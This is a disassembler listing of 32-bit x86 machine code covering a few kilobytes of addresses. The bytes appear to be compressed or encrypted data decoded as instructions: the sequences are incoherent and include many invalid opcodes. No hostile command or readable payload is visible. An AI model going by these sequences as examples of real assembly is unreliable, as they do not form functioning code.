  4355ef:	4a                   	dec    %edx
  4355f0:	b7 97                	mov    $0x97,%bh
  4355f2:	86 f1                	xchg   %dh,%cl
  4355f4:	19 cc                	sbb    %ecx,%esp
  4355f6:	47                   	inc    %edi
  4355f7:	1f                   	pop    %ds
  4355f8:	47                   	inc    %edi
  4355f9:	1a 24 84             	sbb    (%esp,%eax,4),%ah
  4355fc:	de cb                	fmulp  %st,%st(3)
  4355fe:	3e c0 61 f8 18       	shlb   $0x18,%ds:-0x8(%ecx)
  435603:	9e                   	sahf
  435604:	45                   	inc    %ebp
  435605:	d2 f2                	shl    %cl,%dl
  435607:	17                   	pop    %ss
  435608:	67 cb                	addr16 lret
  43560a:	87 74 0a fb          	xchg   %esi,-0x5(%edx,%ecx,1)
  43560e:	b0 ed                	mov    $0xed,%al
  435610:	e1 1c                	loope  0x43562e
  435612:	b1 2c                	mov    $0x2c,%cl
  435614:	a0 d8 e9 63 8c       	mov    0x8c63e9d8,%al
  435619:	e4 3a                	in     $0x3a,%al
  43561b:	1d 45 a9 08 3a       	sbb    $0x3a08a945,%eax
  435620:	64 9c                	fs pushf
  435622:	1f                   	pop    %ds
  435623:	5e                   	pop    %esi
  435624:	46                   	inc    %esi
  435625:	37                   	aaa
  435626:	57                   	push   %edi
  435627:	cb                   	lret
  435628:	b1 b6                	mov    $0xb6,%cl
  43562a:	b6 fd                	mov    $0xfd,%dh
  43562c:	17                   	pop    %ss
  43562d:	87 bf fd 31 91 56    	xchg   %edi,0x569131fd(%edi)
  435633:	23 4c 77 bf          	and    -0x41(%edi,%esi,2),%ecx
  435637:	41                   	inc    %ecx
  435638:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  435639:	da 00                	fiaddl (%eax)
  43563b:	fe                   	(bad)
  43563c:	6b e5 2a             	imul   $0x2a,%ebp,%esp
  43563f:	ac                   	lods   %ds:(%esi),%al
  435640:	c1 5a e3 29          	rcrl   $0x29,-0x1d(%edx)
  435644:	75 33                	jne    0x435679
  435646:	99                   	cltd
  435647:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  435648:	c4 4d 13             	les    0x13(%ebp),%ecx
  43564b:	12 d3                	adc    %bl,%dl
  43564d:	47                   	inc    %edi
  43564e:	94                   	xchg   %eax,%esp
  43564f:	29 5d 46             	sub    %ebx,0x46(%ebp)
  435652:	c5 a9 fb b7 54 ef    	lds    -0x10ab4805(%ecx),%ebp
  435658:	50                   	push   %eax
  435659:	c9                   	leave
  43565a:	67 67 1c 57          	addr16 addr16 sbb $0x57,%al
  43565e:	c6 f8 a1             	xabort $0xa1
  435661:	df b1 42 0f 13 0b    	fbstp  0xb130f42(%ecx)
  435667:	93                   	xchg   %eax,%ebx
  435668:	6c                   	insb   (%dx),%es:(%edi)
  435669:	79 3d                	jns    0x4356a8
  43566b:	04 11                	add    $0x11,%al
  43566d:	55                   	push   %ebp
  43566e:	34 82                	xor    $0x82,%al
  435670:	73 c9                	jae    0x43563b
  435672:	1d f0 5d 85 44       	sbb    $0x44855df0,%eax
  435677:	51                   	push   %ecx
  435678:	0a 70 b8             	or     -0x48(%eax),%dh
  43567b:	95                   	xchg   %eax,%ebp
  43567c:	0a b5 8b 1c 82 0e    	or     0xe821c8b(%ebp),%dh
  435682:	bc e4 45 57 a1       	mov    $0xa15745e4,%esp
  435687:	d7                   	xlat   %ds:(%ebx)
  435688:	ab                   	stos   %eax,%es:(%edi)
  435689:	3b 9a 73 9c 8d 40    	cmp    0x408d9c73(%edx),%ebx
  43568f:	c0 62 15 be          	shlb   $0xbe,0x15(%edx)
  435693:	15 be c9 63 e7       	adc    $0xe763c9be,%eax
  435698:	01 08                	add    %ecx,(%eax)
  43569a:	58                   	pop    %eax
  43569b:	d4 77                	aam    $0x77
  43569d:	5a                   	pop    %edx
  43569e:	93                   	xchg   %eax,%ebx
  43569f:	a1 c7 ba 0f a4       	mov    0xa40fbac7,%eax
  4356a4:	c4 5b 78             	les    0x78(%ebx),%ebx
  4356a7:	ab                   	stos   %eax,%es:(%edi)
  4356a8:	f4                   	hlt
  4356a9:	91                   	xchg   %eax,%ecx
  4356aa:	59                   	pop    %ecx
  4356ab:	17                   	pop    %ss
  4356ac:	af                   	scas   %es:(%edi),%eax
  4356ad:	41                   	inc    %ecx
  4356ae:	63 d7                	arpl   %edx,%edi
  4356b0:	80 5a 0f 98          	sbbb   $0x98,0xf(%edx)
  4356b4:	42                   	inc    %edx
  4356b5:	b7 db                	mov    $0xdb,%bh
  4356b7:	2e 94                	cs xchg %eax,%esp
  4356b9:	73 52                	jae    0x43570d
  4356bb:	73 86                	jae    0x435643
  4356bd:	b5 05                	mov    $0x5,%ch
  4356bf:	09 4a c3             	or     %ecx,-0x3d(%edx)
  4356c2:	b3 dd                	mov    $0xdd,%bl
  4356c4:	56                   	push   %esi
  4356c5:	df b9 14 30 59 ca    	fistpll -0x35a6cfec(%ecx)
  4356cb:	ab                   	stos   %eax,%es:(%edi)
  4356cc:	11 13                	adc    %edx,(%ebx)
  4356ce:	9a 1f 15 a0 0b 22 38 	lcall  $0x3822,$0xba0151f
  4356d5:	81 d2 d9 f0 2f 6a    	adc    $0x6a2ff0d9,%edx
  4356db:	ea 3b 86 9a 7f 1b 70 	ljmp   $0x701b,$0x7f9a863b
  4356e2:	d8 cc                	fmul   %st(4),%st
  4356e4:	14 df                	adc    $0xdf,%al
  4356e6:	1e                   	push   %ds
  4356e7:	89 4c ba f6          	mov    %ecx,-0xa(%edx,%edi,4)
  4356eb:	51                   	push   %ecx
  4356ec:	5c                   	pop    %esp
  4356ed:	c0 52 73 d5          	rclb   $0xd5,0x73(%edx)
  4356f1:	e2 9b                	loop   0x43568e
  4356f3:	d3 2b                	shrl   %cl,(%ebx)
  4356f5:	ff                   	(bad)
  4356f6:	7f a9                	jg     0x4356a1
  4356f8:	b2 92                	mov    $0x92,%dl
  4356fa:	77 cd                	ja     0x4356c9
  4356fc:	0e                   	push   %cs
  4356fd:	61                   	popa
  4356fe:	09 74 2a 87          	or     %esi,-0x79(%edx,%ebp,1)
  435702:	5a                   	pop    %edx
  435703:	e5 6a                	in     $0x6a,%eax
  435705:	86 63 c1             	xchg   %ah,-0x3f(%ebx)
  435708:	d9 ff                	fcos
  43570a:	fa                   	cli
  43570b:	57                   	push   %edi
  43570c:	53                   	push   %ebx
  43570d:	05 a8 e8 5f 7d       	add    $0x7d5fe8a8,%eax
  435712:	a3 a9 7a ef aa       	mov    %eax,0xaaef7aa9
  435717:	88 2e                	mov    %ch,(%esi)
  435719:	1f                   	pop    %ds
  43571a:	60                   	pusha
  43571b:	fd                   	std
  43571c:	e7 10                	out    %eax,$0x10
  43571e:	d1 92 77 f7 9c 20    	rcll   $1,0x209cf777(%edx)
  435724:	08 68 24             	or     %ch,0x24(%eax)
  435727:	cd c4                	int    $0xc4
  435729:	d4 17                	aam    $0x17
  43572b:	15 7d 6b 05 61       	adc    $0x61056b7d,%eax
  435730:	f6 be e3 8b 61 2c    	idivb  0x2c618be3(%esi)
  435736:	28 0c f7             	sub    %cl,(%edi,%esi,8)
  435739:	a0 a4 f7 f0 67       	mov    0x67f0f7a4,%al
  43573e:	1c 85                	sbb    $0x85,%al
  435740:	c6                   	(bad)
  435741:	5e                   	pop    %esi
  435742:	eb fb                	jmp    0x43573f
  435744:	dd 11                	fstl   (%ecx)
  435746:	f6 3e                	idivb  (%esi)
  435748:	48                   	dec    %eax
  435749:	7f ec                	jg     0x435737
  43574b:	24 05                	and    $0x5,%al
  43574d:	c5 33                	lds    (%ebx),%esi
  43574f:	1f                   	pop    %ds
  435750:	ac                   	lods   %ds:(%esi),%al
  435751:	10 a8 1c 72 b5 29    	adc    %ch,0x29b5721c(%eax)
  435757:	02 5a 86             	add    -0x7a(%edx),%bl
  43575a:	78 ca                	js     0x435726
  43575c:	e4 61                	in     $0x61,%al
  43575e:	cf                   	iret
  43575f:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  435760:	88 18                	mov    %bl,(%eax)
  435762:	21 4e f0             	and    %ecx,-0x10(%esi)
  435765:	ac                   	lods   %ds:(%esi),%al
  435766:	db af 56 43 56 86    	fldt   -0x79a9bcaa(%edi)
  43576c:	17                   	pop    %ss
  43576d:	dd e6                	fucom  %st(6)
  43576f:	56                   	push   %esi
  435770:	f8                   	clc
  435771:	85 5d 92             	test   %ebx,-0x6e(%ebp)
  435774:	88 ef                	mov    %ch,%bh
  435776:	10 0d 98 d8 68 9a    	adc    %cl,0x9a68d898
  43577c:	54                   	push   %esp
  43577d:	39 f3                	cmp    %esi,%ebx
  43577f:	7e 39                	jle    0x4357ba
  435781:	70 43                	jo     0x4357c6
  435783:	d0 29                	shrb   $1,(%ecx)
  435785:	93                   	xchg   %eax,%ebx
  435786:	89 62 f6             	mov    %esp,-0xa(%edx)
  435789:	2f                   	das
  43578a:	48                   	dec    %eax
  43578b:	46                   	inc    %esi
  43578c:	08 4c dd 2c          	or     %cl,0x2c(%ebp,%ebx,8)
  435790:	56                   	push   %esi
  435791:	45                   	inc    %ebp
  435792:	96                   	xchg   %eax,%esi
  435793:	87 18                	xchg   %ebx,(%eax)
  435795:	87 0b                	xchg   %ecx,(%ebx)
  435797:	7d 6a                	jge    0x435803
  435799:	26 44                	es inc %esp
  43579b:	c1 81 c6 f1 05 40 c8 	roll   $0xc8,0x4005f1c6(%ecx)
  4357a2:	91                   	xchg   %eax,%ecx
  4357a3:	4e                   	dec    %esi
  4357a4:	17                   	pop    %ss
  4357a5:	39 24 1b             	cmp    %esp,(%ebx,%ebx,1)
  4357a8:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4357a9:	b8 f0 09 ce 98       	mov    $0x98ce09f0,%eax
  4357ae:	70 b3                	jo     0x435763
  4357b0:	0f b7 db             	movzwl %bx,%ebx
  4357b3:	71 75                	jno    0x43582a
  4357b5:	35 f6 d8 84 79       	xor    $0x7984d8f6,%eax
  4357ba:	f5                   	cmc
  4357bb:	93                   	xchg   %eax,%ebx
  4357bc:	53                   	push   %ebx
  4357bd:	27                   	daa
  4357be:	82 20 49             	andb   $0x49,(%eax)
  4357c1:	fa                   	cli
  4357c2:	eb 61                	jmp    0x435825
  4357c4:	2f                   	das
  4357c5:	b0 f2                	mov    $0xf2,%al
  4357c7:	ab                   	stos   %eax,%es:(%edi)
  4357c8:	24 64                	and    $0x64,%al
  4357ca:	1b df                	sbb    %edi,%ebx
  4357cc:	e0 b5                	loopne 0x435783
  4357ce:	32 17                	xor    (%edi),%dl
  4357d0:	5f                   	pop    %edi
  4357d1:	57                   	push   %edi
  4357d2:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4357d3:	fb                   	sti
  4357d4:	71 df                	jno    0x4357b5
  4357d6:	96                   	xchg   %eax,%esi
  4357d7:	b2 5e                	mov    $0x5e,%dl
  4357d9:	36 44                	ss inc %esp
  4357db:	eb 6b                	jmp    0x435848
  4357dd:	82 57 b7 61          	adcb   $0x61,-0x49(%edi)
  4357e1:	4f                   	dec    %edi
  4357e2:	35 a0 70 4b a4       	xor    $0xa44b70a0,%eax
  4357e7:	7a ae                	jp     0x435797
  4357e9:	44                   	inc    %esp
  4357ea:	56                   	push   %esi
  4357eb:	b7 77                	mov    $0x77,%bh
  4357ed:	63 5d 28             	arpl   %ebx,0x28(%ebp)
  4357f0:	31 ed                	xor    %ebp,%ebp
  4357f2:	09 47 d3             	or     %eax,-0x2d(%edi)
  4357f5:	8e 6e 96             	mov    -0x6a(%esi),%gs
  4357f8:	d7                   	xlat   %ds:(%ebx)
  4357f9:	c3                   	ret
  4357fa:	9d                   	popf
  4357fb:	c5 ed 35             	(bad)
  4357fe:	23 0d 49 5e 65 5f    	and    0x5f655e49,%ecx
  435804:	7e ee                	jle    0x4357f4
  435806:	a8 07                	test   $0x7,%al
  435808:	d7                   	xlat   %ds:(%ebx)
  435809:	82 19 87             	sbbb   $0x87,(%ecx)
  43580c:	55                   	push   %ebp
  43580d:	77 12                	ja     0x435821
  43580f:	12 5d 90             	adc    -0x70(%ebp),%bl
  435812:	ca 1c 2c             	lret   $0x2c1c
  435815:	70 83                	jo     0x43579a
  435817:	35 48 72 de 04       	xor    $0x4de7248,%eax
  43581c:	ff cc                	dec    %esp
  43581e:	88 fd                	mov    %bh,%ch
  435820:	ab                   	stos   %eax,%es:(%edi)
  435821:	72 a3                	jb     0x4357c6
  435823:	e1 7f                	loope  0x4358a4
  435825:	33 53 fc             	xor    -0x4(%ebx),%edx
  435828:	d6                   	salc
  435829:	1d 1e a7 d9 7e       	sbb    $0x7ed9a71e,%eax
  43582e:	a1 ee f8 36 49       	mov    0x4936f8ee,%eax
  435833:	48                   	dec    %eax
  435834:	36 8d 4e 15          	lea    %ss:0x15(%esi),%ecx
  435838:	b9 d3 5d 05 71       	mov    $0x71055dd3,%ecx
  43583d:	95                   	xchg   %eax,%ebp
  43583e:	c1 95 38 b1 38 c8 99 	rcll   $0x99,-0x37c74ec8(%ebp)
  435845:	fb                   	sti
  435846:	3c 11                	cmp    $0x11,%al
  435848:	ba bc ab 6c 3f       	mov    $0x3f6cabbc,%edx
  43584d:	ca 67 26             	lret   $0x2667
  435850:	2c 34                	sub    $0x34,%al
  435852:	4a                   	dec    %edx
  435853:	5f                   	pop    %edi
  435854:	6e                   	outsb  %ds:(%esi),(%dx)
  435855:	50                   	push   %eax
  435856:	db 80 fe 97 c5 87    	fildl  -0x783a6802(%eax)
  43585c:	b2 c7                	mov    $0xc7,%dl
  43585e:	5a                   	pop    %edx
  43585f:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  435860:	9c                   	pushf
  435861:	82 b8 ca d0 bc 6b 70 	cmpb   $0x70,0x6bbcd0ca(%eax)
  435868:	ad                   	lods   %ds:(%esi),%eax
  435869:	5a                   	pop    %edx
  43586a:	89 5c 0a 93          	mov    %ebx,-0x6d(%edx,%ecx,1)
  43586e:	05 ff 55 b4 64       	add    $0x64b455ff,%eax
  435873:	8a 78 12             	mov    0x12(%eax),%bh
  435876:	c6                   	(bad)
  435877:	2c 1f                	sub    $0x1f,%al
  435879:	86 0e                	xchg   %cl,(%esi)
  43587b:	b0 df                	mov    $0xdf,%al
  43587d:	64 20 34 35 25 a1 27 	and    %dh,%fs:0x2927a125(,%esi,1)
  435884:	29 
  435885:	d7                   	xlat   %ds:(%ebx)
  435886:	68 17 ea c8 9d       	push   $0x9dc8ea17
  43588b:	d2 14 49             	rclb   %cl,(%ecx,%ecx,2)
  43588e:	21 c1                	and    %eax,%ecx
  435890:	3b 8b c1 bd ca 9d    	cmp    -0x6235423f(%ebx),%ecx
  435896:	00 ca                	add    %cl,%dl
  435898:	85 4d 3f             	test   %ecx,0x3f(%ebp)
  43589b:	72 98                	jb     0x435835
  43589d:	1c 69                	sbb    $0x69,%al
  43589f:	8d a7 34 5b e8 d2    	lea    -0x2d17a4cc(%edi),%esp
  4358a5:	c9                   	leave
  4358a6:	1d a9 95 dc e2       	sbb    $0xe2dc95a9,%eax
  4358ab:	64 b9 2e bd c8 21    	fs mov $0x21c8bd2e,%ecx
  4358b1:	39 fb                	cmp    %edi,%ebx
  4358b3:	88 42 c3             	mov    %al,-0x3d(%edx)
  4358b6:	e6 fb                	out    %al,$0xfb
  4358b8:	e6 e0                	out    %al,$0xe0
  4358ba:	d4 83                	aam    $0x83
  4358bc:	14 22                	adc    $0x22,%al
  4358be:	7e d7                	jle    0x435897
  4358c0:	1e                   	push   %ds
  4358c1:	58                   	pop    %eax
  4358c2:	6d                   	insl   (%dx),%es:(%edi)
  4358c3:	5b                   	pop    %ebx
  4358c4:	b7 65                	mov    $0x65,%bh
  4358c6:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4358c7:	c3                   	ret
  4358c8:	2b 2d 22 30 4c 8b    	sub    0x8b4c3022,%ebp
  4358ce:	07                   	pop    %es
  4358cf:	d6                   	salc
  4358d0:	d7                   	xlat   %ds:(%ebx)
  4358d1:	6b ac c1 1b eb e1 6d 	imul   $0x13,0x6de1eb1b(%ecx,%eax,8),%ebp
  4358d8:	13 
  4358d9:	86 9f d5 e4 20 50    	xchg   %bl,0x5020e4d5(%edi)
  4358df:	c5 42 0c             	lds    0xc(%edx),%eax
  4358e2:	9f                   	lahf
  4358e3:	f9                   	stc
  4358e4:	7c da                	jl     0x4358c0
  4358e6:	5c                   	pop    %esp
  4358e7:	5e                   	pop    %esi
  4358e8:	4c                   	dec    %esp
  4358e9:	f6 5f 4b             	negb   0x4b(%edi)
  4358ec:	37                   	aaa
  4358ed:	e5 91                	in     $0x91,%eax
  4358ef:	58                   	pop    %eax
  4358f0:	dc 98 fc f4 62 71    	fcompl 0x7162f4fc(%eax)
  4358f6:	86 dc                	xchg   %bl,%ah
  4358f8:	19 7d d2             	sbb    %edi,-0x2e(%ebp)
  4358fb:	65 67 7a 6a          	gs addr16 jp 0x435969
  4358ff:	9a 83 09 51 35 d1 37 	lcall  $0x37d1,$0x35510983
  435906:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  435907:	f7 85 5f a4 07 17 6f 	testl  $0x214196f,0x1707a45f(%ebp)
  43590e:	19 14 02 
  435911:	dc 17                	fcoml  (%edi)
  435913:	2f                   	das
  435914:	a3 e2 23 a5 f7       	mov    %eax,0xf7a523e2
  435919:	33 8b 4f 93 7c 04    	xor    0x47c934f(%ebx),%ecx
  43591f:	eb ed                	jmp    0x43590e
  435921:	d8 3b                	fdivrs (%ebx)
  435923:	99                   	cltd
  435924:	58                   	pop    %eax
  435925:	f7 b9 ef a4 a1 0c    	idivl  0xca1a4ef(%ecx)
  43592b:	32 02                	xor    (%edx),%al
  43592d:	f8                   	clc
  43592e:	32 04 06             	xor    (%esi,%eax,1),%al
  435931:	3f                   	aas
  435932:	bf 4b 0a a1 d4       	mov    $0xd4a10a4b,%edi
  435937:	db 0b                	fisttpl (%ebx)
  435939:	d3 37                	shll   %cl,(%edi)
  43593b:	e8 a8 2e 35 36       	call   0x367887e8
  435940:	87 1c 4e             	xchg   %ebx,(%esi,%ecx,2)
  435943:	f1                   	int1
  435944:	92                   	xchg   %eax,%edx
  435945:	05 b3 d1 f7 6a       	add    $0x6af7d1b3,%eax
  43594a:	9c                   	pushf
  43594b:	b0 3c                	mov    $0x3c,%al
  43594d:	23 5f 61             	and    0x61(%edi),%ebx
  435950:	a8 4d                	test   $0x4d,%al
  435952:	4f                   	dec    %edi
  435953:	50                   	push   %eax
  435954:	b5 34                	mov    $0x34,%ch
  435956:	bd 96 fd 68 f9       	mov    $0xf968fd96,%ebp
  43595b:	db 9d de 04 d4 1d    	fistpl 0x1dd404de(%ebp)
  435961:	dc 99 82 2a ae d3    	fcompl -0x2c51d57e(%ecx)
  435967:	a0 52 9e a5 50       	mov    0x50a59e52,%al
  43596c:	b1 90                	mov    $0x90,%cl
  43596e:	11 7c a9 fb          	adc    %edi,-0x5(%ecx,%ebp,4)
  435972:	cd 6a                	int    $0x6a
  435974:	41                   	inc    %ecx
  435975:	fa                   	cli
  435976:	8f                   	(bad)
  435977:	fb                   	sti
  435978:	3b ec                	cmp    %esp,%ebp
  43597a:	0b a9 1f 2c 55 b9    	or     -0x46aad3e1(%ecx),%ebp
  435980:	66 a2 9c 4b e7 5f    	data16 mov %al,0x5fe74b9c
  435986:	16                   	push   %ss
  435987:	11 50 a4             	adc    %edx,-0x5c(%eax)
  43598a:	67 c0 8f a0 d2 5d    	rorb   $0x5d,-0x2d60(%bx)
  435990:	2c ba                	sub    $0xba,%al
  435992:	45                   	inc    %ebp
  435993:	d1 3a                	sarl   $1,(%edx)
  435995:	b9 d6 6d b0 3a       	mov    $0x3ab06dd6,%ecx
  43599a:	ce                   	into
  43599b:	51                   	push   %ecx
  43599c:	32 52 5e             	xor    0x5e(%edx),%dl
  43599f:	ba 12 21 58 5a       	mov    $0x5a582112,%edx
  4359a4:	ed                   	in     (%dx),%eax
  4359a5:	c8 d6 af 08          	enter  $0xafd6,$0x8
  4359a9:	8a 8a f2 af a5 8d    	mov    -0x725a500e(%edx),%cl
  4359af:	fa                   	cli
  4359b0:	9c                   	pushf
  4359b1:	11 35 da 84 c3 5a    	adc    %esi,0x5ac384da
  4359b7:	b7 fb                	mov    $0xfb,%bh
  4359b9:	85 1d 53 b7 9d ce    	test   %ebx,0xce9db753
  4359bf:	57                   	push   %edi
  4359c0:	d8 ff                	fdivr  %st(7),%st
  4359c2:	99                   	cltd
  4359c3:	59                   	pop    %ecx
  4359c4:	59                   	pop    %ecx
  4359c5:	5f                   	pop    %edi
  4359c6:	96                   	xchg   %eax,%esi
  4359c7:	44                   	inc    %esp
  4359c8:	03 55 92             	add    -0x6e(%ebp),%edx
  4359cb:	85 87 4d 42 20 42    	test   %eax,0x4220424d(%edi)
  4359d1:	92                   	xchg   %eax,%edx
  4359d2:	1f                   	pop    %ds
  4359d3:	02 6e 8f             	add    -0x71(%esi),%ch
  4359d6:	71 72                	jno    0x435a4a
  4359d8:	da d3                	fcmovbe %st(3),%st
  4359da:	7c 5f                	jl     0x435a3b
  4359dc:	c0 3a c2             	sarb   $0xc2,(%edx)
  4359df:	fe                   	(bad)
  4359e0:	65 6e                	outsb  %gs:(%esi),(%dx)
  4359e2:	b0 40                	mov    $0x40,%al
  4359e4:	ae                   	scas   %es:(%edi),%al
  4359e5:	9c                   	pushf
  4359e6:	61                   	popa
  4359e7:	e5 53                	in     $0x53,%eax
  4359e9:	d8 52 e3             	fcoms  -0x1d(%edx)
  4359ec:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4359ed:	83 c2 fc             	add    $0xfffffffc,%edx
  4359f0:	eb 4c                	jmp    0x435a3e
  4359f2:	bc f5 aa 10 4e       	mov    $0x4e10aaf5,%esp
  4359f7:	37                   	aaa
  4359f8:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4359f9:	e8 99 31 dd 55       	call   0x56208b97
  4359fe:	1b 0b                	sbb    (%ebx),%ecx
  435a00:	05 f0 7f 76 54       	add    $0x54767ff0,%eax
  435a05:	20 db                	and    %bl,%bl
  435a07:	06                   	push   %es
  435a08:	c7                   	(bad)
  435a09:	4a                   	dec    %edx
  435a0a:	75 f8                	jne    0x435a04
  435a0c:	36 c9                	ss leave
  435a0e:	73 7e                	jae    0x435a8e
  435a10:	d6                   	salc
  435a11:	09 05 b0 4b 2b 87    	or     %eax,0x872b4bb0
  435a17:	cc                   	int3
  435a18:	20 3c 13             	and    %bh,(%ebx,%edx,1)
  435a1b:	3c fa                	cmp    $0xfa,%al
  435a1d:	bb ab f0 d9 8e       	mov    $0x8ed9f0ab,%ebx
  435a22:	11 27                	adc    %esp,(%edi)
  435a24:	1f                   	pop    %ds
  435a25:	4e                   	dec    %esi
  435a26:	cf                   	iret
  435a27:	8e 29                	mov    (%ecx),%gs
  435a29:	4e                   	dec    %esi
  435a2a:	a8 20                	test   $0x20,%al
  435a2c:	14 9c                	adc    $0x9c,%al
  435a2e:	42                   	inc    %edx
  435a2f:	e6 fa                	out    %al,$0xfa
  435a31:	d4 31                	aam    $0x31
  435a33:	68 48 1c 8d 5c       	push   $0x5c8d1c48
  435a38:	ea 48 9d 75 83 49 81 	ljmp   $0x8149,$0x83759d48
  435a3f:	1e                   	push   %ds
  435a40:	0e                   	push   %cs
  435a41:	91                   	xchg   %eax,%ecx
  435a42:	f2 1b 1a             	repnz sbb (%edx),%ebx
  435a45:	5e                   	pop    %esi
  435a46:	94                   	xchg   %eax,%esp
  435a47:	41                   	inc    %ecx
  435a48:	67 01 9e 8f 32       	add    %ebx,0x328f(%bp)
  435a4d:	f9                   	stc
  435a4e:	c9                   	leave
  435a4f:	aa                   	stos   %al,%es:(%edi)
  435a50:	81 1d 79 b1 68 1d 32 	sbbl   $0x688acd32,0x1d68b179
  435a57:	cd 8a 68 
  435a5a:	02 7a 38             	add    0x38(%edx),%bh
  435a5d:	8b 41 05             	mov    0x5(%ecx),%eax
  435a60:	c8 3f 97 2b          	enter  $0x973f,$0x2b
  435a64:	b6 fc                	mov    $0xfc,%dh
  435a66:	4e                   	dec    %esi
  435a67:	43                   	inc    %ebx
  435a68:	ff 0b                	decl   (%ebx)
  435a6a:	1b 82 ca ef b5 2c    	sbb    0x2cb5efca(%edx),%eax
  435a70:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  435a71:	dc c6                	fadd   %st,%st(6)
  435a73:	0c 61                	or     $0x61,%al
  435a75:	7c 55                	jl     0x435acc
  435a77:	84 b1 3a 6b f9 c8    	test   %dh,-0x370694c6(%ecx)
  435a7d:	06                   	push   %es
  435a7e:	65 3f                	gs aas
  435a80:	67 bd dd d6 13 4c    	addr16 mov $0x4c13d6dd,%ebp
  435a86:	5b                   	pop    %ebx
  435a87:	99                   	cltd
  435a88:	9c                   	pushf
  435a89:	72 08                	jb     0x435a93
  435a8b:	b7 96                	mov    $0x96,%bh
  435a8d:	cb                   	lret
  435a8e:	e7 18                	out    %eax,$0x18
  435a90:	3e 81 48 4a ea 96 23 	orl    $0xfa2396ea,%ds:0x4a(%eax)
  435a97:	fa 
  435a98:	aa                   	stos   %al,%es:(%edi)
  435a99:	ea c7 a3 99 14 64 9f 	ljmp   $0x9f64,$0x1499a3c7
  435aa0:	8e a0 c4 91 8a 05    	mov    0x58a91c4(%eax),%fs
  435aa6:	4f                   	dec    %edi
  435aa7:	68 29 ef d2 38       	push   $0x38d2ef29
  435aac:	14 6d                	adc    $0x6d,%al
  435aae:	e9 dd d1 a9 02       	jmp    0x2ed2c90
  435ab3:	c3                   	ret
  435ab4:	60                   	pusha
  435ab5:	b7 a8                	mov    $0xa8,%bh
  435ab7:	6e                   	outsb  %ds:(%esi),(%dx)
  435ab8:	3c 03                	cmp    $0x3,%al
  435aba:	66 c7                	data16 (bad)
  435abc:	d6                   	salc
  435abd:	c5 dc 1a             	(bad)
  435ac0:	ec                   	in     (%dx),%al
  435ac1:	5a                   	pop    %edx
  435ac2:	9f                   	lahf
  435ac3:	37                   	aaa
  435ac4:	76 ef                	jbe    0x435ab5
  435ac6:	fe                   	(bad)
  435ac7:	20 0d f0 a2 74 06    	and    %cl,0x674a2f0
  435acd:	19 f5                	sbb    %esi,%ebp
  435acf:	9f                   	lahf
  435ad0:	1f                   	pop    %ds
  435ad1:	57                   	push   %edi
  435ad2:	88 ec                	mov    %ch,%ah
  435ad4:	97                   	xchg   %eax,%edi
  435ad5:	40                   	inc    %eax
  435ad6:	db 27                	(bad) (%edi)
  435ad8:	40                   	inc    %eax
  435ad9:	c8 44 1a e5          	enter  $0x1a44,$0xe5
  435add:	99                   	cltd
  435ade:	0f 22 08             	mov    %eax,%cr1
  435ae1:	64 3e 70 e3          	fs jo,pt 0x435ac8
  435ae5:	92                   	xchg   %eax,%edx
  435ae6:	e3 01                	jecxz  0x435ae9
  435ae8:	8d 69 f0             	lea    -0x10(%ecx),%ebp
  435aeb:	fa                   	cli
  435aec:	3e d8 29             	fsubrs %ds:(%ecx)
  435aef:	92                   	xchg   %eax,%edx
  435af0:	97                   	xchg   %eax,%edi
  435af1:	31 3e                	xor    %edi,(%esi)
  435af3:	6c                   	insb   (%dx),%es:(%edi)
  435af4:	c1 5d 62 25          	rcrl   $0x25,0x62(%ebp)
  435af8:	c8 ac 89 57          	enter  $0x89ac,$0x57
  435afc:	cd ce                	int    $0xce
  435afe:	02 0d 33 50 d2 ed    	add    0xedd25033,%cl
  435b04:	82 2c 2b 33          	subb   $0x33,(%ebx,%ebp,1)
  435b08:	9b                   	fwait
  435b09:	6d                   	insl   (%dx),%es:(%edi)
  435b0a:	31 7e ff             	xor    %edi,-0x1(%esi)
  435b0d:	0d bb 5b df 58       	or     $0x58df5bbb,%eax
  435b12:	eb 38                	jmp    0x435b4c
  435b14:	27                   	daa
  435b15:	a2 6a 05 57 89       	mov    %al,0x8957056a
  435b1a:	1a 72 02             	sbb    0x2(%edx),%dh
  435b1d:	3e 02 f6             	ds add %dh,%dh
  435b20:	49                   	dec    %ecx
  435b21:	25 43 24 de 47       	and    $0x47de2443,%eax
  435b26:	c5 8c 0e 7d 6b 27 bc 	lds    -0x43d89483(%esi,%ecx,1),%ecx
  435b2d:	4e                   	dec    %esi
  435b2e:	9d                   	popf
  435b2f:	74 4b                	je     0x435b7c
  435b31:	33 76 19             	xor    0x19(%esi),%esi
  435b34:	19 44 73 29          	sbb    %eax,0x29(%ebx,%esi,2)
  435b38:	d1 d3                	rcl    $1,%ebx
  435b3a:	04 d3                	add    $0xd3,%al
  435b3c:	de ac 5e c4 ae 5d d8 	fisubrs -0x27a2513c(%esi,%ebx,2)
  435b43:	e7 21                	out    %eax,$0x21
  435b45:	4d                   	dec    %ebp
  435b46:	ec                   	in     (%dx),%al
  435b47:	26 bc 0c 4d 09 9b    	es mov $0x9b094d0c,%esp
  435b4d:	13 1e                	adc    (%esi),%ebx
  435b4f:	94                   	xchg   %eax,%esp
  435b50:	01 7b 2c             	add    %edi,0x2c(%ebx)
  435b53:	82 37 d3             	xorb   $0xd3,(%edi)
  435b56:	6d                   	insl   (%dx),%es:(%edi)
  435b57:	a2 54 80 92 1e       	mov    %al,0x1e928054
  435b5c:	d5 86                	aad    $0x86
  435b5e:	9d                   	popf
  435b5f:	95                   	xchg   %eax,%ebp
  435b60:	68 cf dc 77 17       	push   $0x1777dccf
  435b65:	d1 0b                	rorl   $1,(%ebx)
  435b67:	90                   	nop
  435b68:	5f                   	pop    %edi
  435b69:	7c 62                	jl     0x435bcd
  435b6b:	f3 73 80             	repz jae 0x435aee
  435b6e:	c3                   	ret
  435b6f:	32 69 ac             	xor    -0x54(%ecx),%ch
  435b72:	35 4a 77 a5 9e       	xor    $0x9ea5774a,%eax
  435b77:	10 45 d2             	adc    %al,-0x2e(%ebp)
